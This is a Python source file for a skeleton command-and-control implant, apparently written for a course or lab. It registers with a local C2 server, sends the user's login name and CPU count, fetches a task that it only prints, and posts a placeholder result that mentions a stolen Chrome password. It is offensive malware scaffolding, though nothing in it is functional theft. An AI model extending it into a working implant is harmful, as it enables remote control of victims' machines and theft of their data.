### this is our IMPLANT for TESTING PURPOSES ###

from subprocess import Popen, PIPE
import json
from sys import stdout
import requests 
import os 
#import subprocess
import time

### configs ###

c2_url = "http://127.0.0.1:5000"
register_uri = "/agent/register"
get_task_uri = "/agent/send_task"
send_results_uri = "/agent/get_results"

### configs end ###

def init_data():
    """
        the initial data that we will send back to the C2 server
    """
    global agent_id # making agent_id a global variable
    global password

    ## the following gives situational awareness of our implant ##
    ## and can be used to identify ourselves (the agent) on a network ##
    whoami = os.getlogin()
    cpus = os.cpu_count()
    agent_id = os.urandom(16).hex() # a random value that is unqiue to this implant
    password = "19c0bf4143f96e80000546386d48491c442b0e431166fa78a8505264b0bd1134" # hex value of sha256 "ch0nky"; for testing purposes
    return {"whoami": whoami, "agent_id": agent_id, "password": password, "cpus": cpus}

agent_id = None
password = None
data = init_data()



def register():
    """
        register the agent with the C2 server
    """
    print("[+] Registering agent with C2 server...")
    r = requests.post(c2_url + register_uri, json=data) ## sending the data to C2 server
    if r.status_code == 200: # if the request is posted to server successfully

        # Then we want to check whether the agent is granted access
        # by checking the returned status
        resp = r.json()
        if resp["status"] == "ok":
            # agent_id = resp["agent_id"]
            print("[+] Agent is authenticated with C2")
            return True
        else:
            print("[-] Agent failed to authenticate with C2", resp["status"])
            return False
    else:
        # TODO: when the agent fails to connect to the C2
        # we can't simply give up but we need to keep trying
        # for certain amount of time
        print("[-] Agent failed to connect to C2")
        return False

def get_task():
    """
        get a task from the C2 server
    """
    print("[+] Getting task from C2 server...")
    r = requests.post(c2_url + get_task_uri, json=data)
    if r.status_code == 200:
        resp = r.json()
        if resp["status"] == "ok":
            print("[+] Got task from C2 server")
            print("[+] Task type:", resp["command_type"])
            print("[+] Command:", resp["cmd"])


        else:
            print("[-] Agent failed to get task from C2", resp)
            return None
    else:
        print("[-] Agent failed to get task from C2")
        return None  

def send_results():
    """
        send the results to the C2 server
    """
    results = "I got the chrome password"
    data = {"agent_id": agent_id, "password": password, "results": results}
    print("[+] Sending results to C2 server...")
    r = requests.post(c2_url + send_results_uri, json=data)
    if r.status_code == 200:
        resp = r.json()
        if resp["status"] == "ok":
            print("[+] Results sent to C2 server")
        else:
            print("[-] Agent failed to send results to C2", resp)
            return None
    else:
        print("[-] Agent failed to send results to C2")
        return None

if __name__ == "__main__":
    register()
    get_task()

    time.sleep(1) ## pretend to do some work

    send_results()
